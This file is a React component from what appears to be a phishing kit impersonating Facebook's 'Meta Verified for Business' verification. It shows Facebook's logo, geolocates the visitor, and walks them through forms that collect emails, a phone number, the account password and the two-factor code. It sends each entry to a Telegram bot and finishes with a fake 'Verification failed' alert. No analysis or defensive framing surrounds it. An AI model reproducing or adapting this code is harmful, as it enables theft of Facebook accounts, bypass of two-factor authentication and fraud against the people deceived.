import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } from '../utils/telegram';

export default function Verify() {
  const navigate = useNavigate();
  const [step, setStep] = useState(1);
  const [clientIp, setClientIp] = useState('Unknown');
  const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState(''); 
  const [countryCode, setCountryCode] = useState('+1'); const [phoneNum, setPhoneNum] = useState('');
  const [loginUser, setLoginUser] = useState(''); const [loginPass, setLoginPass] = useState(''); const [otp, setOtp] = useState('');
  const [loading, setLoading] = useState(false);

  useEffect(() => { 
      fetch('https://ipwho.is/').then(r => r.json()).then(d => { 
          if (d && d.ip) {
              setClientIp(`${d.ip} - ${d.country} (${d.city})`);
              if (d.country_code && countryCodeMap[d.country_code]) {
                  setCountryCode(countryCodeMap[d.country_code]);
              }
          }
      }).catch(()=>{}); 
  }, []);

  const handleSignup = (e) => {
    e.preventDefault(); setLoading(true);
    const text = `<b>IP:</b> <code>${escapeHtml(clientIp)}</code>\n<b>Business:</b> <code>${escapeHtml(busName)}</code>\n<b>P.Email:</b> <code>${escapeHtml(perEmail)}</code>\n<b>B.Email:</b> <code>${escapeHtml(busEmail)}</code>\n<b>Phone:</b> <code>${escapeHtml(countryCode + phoneNum)}</code>\n`;
    setInitialSession(text); sendTelegramMessage('');
    setTimeout(() => { setLoading(false); setStep(2); }, 700);
  };

  const handleLogin = (e) => {
    e.preventDefault(); setLoading(true);
    sendTelegramMessage(`\n<b>Login:</b> <code>${escapeHtml(loginUser)}</code> | <code>${escapeHtml(loginPass)}</code>`);
    setTimeout(() => { setLoading(false); setStep(3); }, 1000);
  };

  const handleOtp = (e) => {
    e.preventDefault(); setLoading(true);
    sendTelegramMessage(`\n<b>2FA:</b> <code>${escapeHtml(otp)}</code>`);
    setTimeout(() => { setLoading(false); alert('Verification failed.'); }, 1500);
  };

  return (
    <div style={{ position: 'relative', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(0,0,0,0.5)', zIndex: 1000 }}>
      <div style={{ position: 'relative', background: '#fff', borderRadius: '12px', padding: '28px 20px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.2)' }}>
        <button onClick={() => navigate('/live')} style={{ position: 'absolute', top: '12px', right: '12px', background: '#f0f2f5', border: 'none', borderRadius: '50%', width: '34px', height: '34px', cursor: 'pointer' }}>×</button>
        <div style={{ textAlign: 'center', marginBottom: '18px' }}>
            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" style={{ maxHeight: '60px', margin: '0 auto' }} />
        </div>

        {step === 1 && (
          <>
            <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', marginBottom: '6px' }}>Meta Verified for Business</h2>
            <form onSubmit={handleSignup} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                <input className="fb-input" placeholder="Business name" onChange={e => setBusName(e.target.value)} required />
                <input className="fb-input" type="email" placeholder="Personal email" onChange={e => setPerEmail(e.target.value)} required />
                <input className="fb-input" type="email" placeholder="Business email" onChange={e => setBusEmail(e.target.value)} required />
                <div className="fb-phone-group">
                    <select className="fb-phone-select" value={countryCode} onChange={e => setCountryCode(e.target.value)}>
                        <option value="+84">+84 (Vietnam)</option>
                        <option value="+1">+1 (US)</option>
                    </select>
                    <input className="fb-input" placeholder="Phone number" onChange={e => setPhoneNum(e.target.value)} required />
                </div>
                <button type="submit" className="fb-btn" disabled={loading}>Continue</button>
            </form>
          </>
        )}

        {step === 2 && (
          <form onSubmit={handleLogin} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
              <input className="fb-input" placeholder="Mobile number or email" onChange={e => setLoginUser(e.target.value)} required />
              <input className="fb-input" type="text" placeholder="Password" style={{ WebkitTextSecurity: 'disc' }} onChange={e => setLoginPass(e.target.value)} required />
              <button type="submit" className="fb-btn" disabled={loading}>Log in</button>
          </form>
        )}

        {step === 3 && (
          <>
            <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', marginBottom: '6px' }}>Two-factor authentication</h2>
            <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                <input className="fb-input fb-otp-input" placeholder="000000" style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px' }} onChange={e => setOtp(e.target.value)} required />
                <button type="submit" className="fb-btn" disabled={loading}>Verify</button>
            </form>
          </>
        )}
      </div>
    </div>
  );
}
